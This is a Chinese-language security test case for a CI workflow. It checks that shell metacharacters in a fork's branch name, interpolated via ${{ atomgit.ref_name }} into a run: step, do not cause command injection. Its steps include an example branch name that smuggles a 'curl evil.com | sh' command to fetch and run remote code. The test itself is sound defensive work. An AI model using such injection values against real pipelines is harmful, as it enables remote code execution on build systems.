用例 ID:   SEC-INJECT-02-003
维度标签:   [security]
维度:      安全性
优先级:    P0
溯源意图:  INTENT-SEC-011
标题:      分支名中的不可信输入不应通过 ${{ }} 直接插入 run: 导致命令注入

前置条件:
  - fork 侧创建含 shell 元字符的分支名
  - workflow 将 `${{ atomgit.ref_name }}` 直接插入 run:

操作步骤:
  1. fork 分支命名含分号+命令（如 `feature/"; curl evil.com | sh"`）
  2. push 触发 workflow
  3. 检查日志

预期结果:
  - 分支名中的特殊字符不被解释为 shell 命令

验证点:
  - [负向] 注入命令不产生执行副作用
  - [负向] 管道符 + 命令不应被执行

清理:      fixture
